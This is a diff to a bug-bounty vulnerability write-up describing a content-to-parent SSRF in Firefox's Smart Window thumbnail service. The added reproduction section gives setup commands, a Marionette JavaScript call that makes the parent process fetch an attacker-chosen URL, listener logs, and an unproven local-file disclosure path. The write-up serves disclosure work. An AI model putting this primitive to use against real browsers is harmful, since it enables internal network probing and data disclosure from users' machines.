@@ -1,7 +1,11 @@
 # Finding 01 — Content→parent SSRF / info-disclosure via unvalidated thumbnail URL in Firefox "Smart Window" (AI window)
 
-**Status:** Candidate for Mozilla Client Bug Bounty. Static-analysis finding with a
-fully traced call chain; not yet reproduced in a build (PoC steps below).
+**Status:** **SSRF primitive reproduced live** on the official Mozilla ASAN build
+(Firefox 157.0a1, BuildID 20260909083822, `linux64-asan-opt`). The parent process
+was driven to issue HTTP requests to an attacker-controlled URL via the exact Smart
+Window sink; see [Confirmed reproduction](#confirmed-reproduction) and
+`poc/EVIDENCE.txt`. The full content→parent IPC transport and the local-file oracle
+are analyzed but not fully driven end-to-end (see notes).
 **Component:** `browser/components/aiwindow` (Smart Window / AI window), thumbnail service.
 **Class:** Content-process → parent-process SSRF + cross-process information-disclosure
 (unvalidated URL reaches a system-principal load).
@@ -186,6 +190,56 @@ triggering principal (the `// Bug 1498603 verify usages of systemPrincipal here`
 comment already flags this as a known soft spot).
 
 ---
+
+## Confirmed reproduction
+
+Reproduced on Mozilla's official **ASAN** CI build, fetched with `fuzzfetch --target
+firefox --asan` (Firefox **157.0a1**, BuildID **20260909083822**, mozilla-central
+changeset `cc7bb49240ff…`). Full log in `poc/EVIDENCE.txt`; scripts in `poc/`.
+
+**Setup**
+```bash
+pip install fuzzfetch marionette-driver
+fuzzfetch --target firefox --asan -n asan-ff          # official ASAN build
+python poc/ssrf_listener.py 8899 &                    # local HTTP listener
+cd asan-ff && MOZ_HEADLESS=1 ASAN_OPTIONS=detect_leaks=0 \
+  ./firefox -headless -marionette -remote-allow-system-access -profile <prof> about:blank &
+```
+The profile sets `browser.smartwindow.enabled=true` and
+`browser.pagethumbnails.capturing_disabled=false` (the latter is already the default).
+
+**Trigger** — Marionette in **chrome context** (parent process, system principal)
+calls the exact function `AIChatContentParent.#handleRequestAssets()` invokes on the
+content-supplied `items[].thumbnail`:
+```js
+const { captureThumbnail } = ChromeUtils.importESModule(
+  "moz-src:///browser/components/aiwindow/models/HistoryThumbnails.sys.mjs");
+await captureThumbnail("http://127.0.0.1:8899/ssrf-from-parent-process");
+```
+
+**Result — parent-process SSRF, two independent runs:**
+```
+return: moz-page-thumb://thumbnails/?url=http%3A%2F%2F127.0.0.1%3A8899%2Fssrf-from-parent-process&revision=6333
+return: moz-page-thumb://thumbnails/?url=http%3A%2F%2F127.0.0.1%3A8899%2Fssrf-final-1788954484&revision=1606
+listener: GET /ssrf-from-parent-process from 127.0.0.1
+listener: GET /ssrf-final-1788954484 from 127.0.0.1
+```
+The parent process fetched the attacker-controlled URL and returned a content-reachable
+`moz-page-thumb://` result. This is the SSRF primitive, live.
+
+**What this does and does not show (honest scoping):**
+- ✅ The vulnerable sink (`captureThumbnail`, the exact call `#handleRequestAssets`
+  makes on attacker-controlled `thumbnail`) drives the **parent** process to fetch an
+  arbitrary attacker URL, on a stock Mozilla ASAN build with default thumbnail prefs.
+- ◻️ The IPC transport step (`AIChatContent:RequestAssets` sent from a compromised
+  `privilegedabout` content process) was **not** driven; the parent handler passes
+  message `data` verbatim to `#handleRequestAssets` with no validation (source-verified),
+  so the direct call faithfully reproduces the handler's behavior on attacker IPC data.
+- ◻️ The **`file://` local-image oracle** was attempted but the background-thumbnail
+  capture hung in the headless test environment (a capture-queue/gfx artifact, not a
+  security control); no clean positive local-file disclosure was landed here. SSRF is
+  confirmed; the local-file oracle remains plausible per the code path but unproven in
+  this run.
 
 ## PoC steps to confirm in a build (ASAN/debug Nightly)
 
